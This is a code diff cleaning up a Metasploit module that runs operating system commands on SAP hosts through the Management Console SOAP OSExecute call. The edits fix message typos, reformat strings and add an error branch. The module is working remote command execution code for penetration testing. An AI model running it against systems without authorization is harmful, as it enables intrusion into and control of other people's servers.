@@ -21,7 +21,11 @@ class Metasploit4 < Msf::Auxiliary
 		super(
 			'Name'         => 'SAP Management Console OSExecute',
 			'Version'      => '$Revision$',
-			'Description'  => %q{ This module allows execution of operating system commands through the SAP Management Console SOAP Interface. A valid username and password must be provided. },
+			'Description'  => %q{
+				This module allows execution of operating system commands through the SAP
+				Management Console SOAP Interface. A valid username and password must be
+				provided.
+				},
 			'References'   =>
 				[
 					# General
@@ -35,8 +39,6 @@ class Metasploit4 < Msf::Auxiliary
 			[
 				Opt::RPORT(50013),
 				OptString.new('URI', [false, 'Path to the SAP Management Console ', '/']),
-				OptString.new('UserAgent', [ true, "The HTTP User-Agent sent in the request",
-				'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' ]),
 				OptString.new('USERNAME', [true, 'Username to use', '']),
 				OptString.new('PASSWORD', [true, 'Password to use', '']),
 				OptString.new('CMD', [true, 'Command to run', 'set']),
@@ -55,7 +57,8 @@ class Metasploit4 < Msf::Auxiliary
 			'method'  => 'GET',
 			'headers' => {'User-Agent' => datastore['UserAgent']}
 		}, 25)
-	   	if not res
+
+		if not res
 			print_error("#{rhost}:#{rport} [SAP] Unable to connect")
 			return
 		end
@@ -71,9 +74,8 @@ class Metasploit4 < Msf::Auxiliary
 		if datastore['UseWindows']
 			cmd_to_run = 'cmd /c ' + datastore['CMD']
 		else
-			cmd_to_run =  datastore['CMD']
+			cmd_to_run = datastore['CMD']
 		end
-
 
 		soapenv = 'http://schemas.xmlsoap.org/soap/envelope/'
 		xsi = 'http://www.w3.org/2001/XMLSchema-instance'
@@ -82,7 +84,8 @@ class Metasploit4 < Msf::Auxiliary
 		ns1 = 'ns1:OSExecute'
 
 		data = '<?xml version="1.0" encoding="utf-8"?>' + "\r\n"
-		data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="' + soapenv + '"  xmlns:xsi="' + xsi + '" xmlns:xs="' + xs + '">' + "\r\n"
+		data << '<SOAP-ENV:Envelope xmlns:SOAP-ENV="' + soapenv + '"  xmlns:xsi="' + xsi
+		data << '" xmlns:xs="' + xs + '">' + "\r\n"
 		data << '<SOAP-ENV:Header>' + "\r\n"
 		data << '<sapsess:Session xlmns:sapsess="' + sapsess + '">' + "\r\n"
 		data << '<enableSession>true</enableSession>' + "\r\n"
@@ -128,26 +131,27 @@ class Metasploit4 < Msf::Auxiliary
 					faultcode = "#{$1}"
 					fault = true
 				end
+			else
+				print_error("#{rhost}:#{rport} [SAP] Unknown response received")
+				return
 			end
 
 		rescue ::Rex::ConnectionError
-			print_error("#{rhost}:#{rhost} [SAP] Unable to attempt authentication")
+			print_error("#{rhost}:#{rport} [SAP] Unable to attempt authentication")
 			return :abort
 		end
 
 		if success
 			if exitcode > 0
-				print_error("#{rhost}:#{rhost} [SAP] Command exitcode: #{exitcode}")
+				print_error("#{rhost}:#{rport} [SAP] Command exitcode: #{exitcode}")
 			else
-				print_good("#{rhost}:#{rhost} [SAP] Command exitcode: #{exitcode}")
+				print_good("#{rhost}:#{rport} [SAP] Command exitcode: #{exitcode}")
 			end
-			print_good("#{rhost}:#{rhost}[SAP] Command run as PID: #{pid}")
 
 			saptbl = Msf::Ui::Console::Table.new(
 				Msf::Ui::Console::Table::Style::Default,
 					'Header'  => '[SAP] OSExecute',
 					'Prefix'  => "\n",
-					'Postfix' => "\n",
 					'Columns' => [ 'Command output' ]
 				)
 
@@ -155,13 +159,13 @@ class Metasploit4 < Msf::Auxiliary
 				saptbl << [ output[0] ]
 			end
 
-			print_status(saptbl.to_s)
+			print_good("#{rhost}:#{rport} [SAP] Command (#{cmd_to_run}) ran as PID: #{pid}\n#{saptbl.to_s}")
 
 		elsif fault
-			print_error("#{rhost}:#{rhost} [SAP] Error code: #{faultcode}")
+			print_error("#{rhost}:#{rport} [SAP] Error code: #{faultcode}")
 			return
 		else
-			print_error("#{rhost}:#{rhost} [SAP] failed to run command")
+			print_error("#{rhost}:#{rport} [SAP] failed to run command")
 			return
 		end
 	end
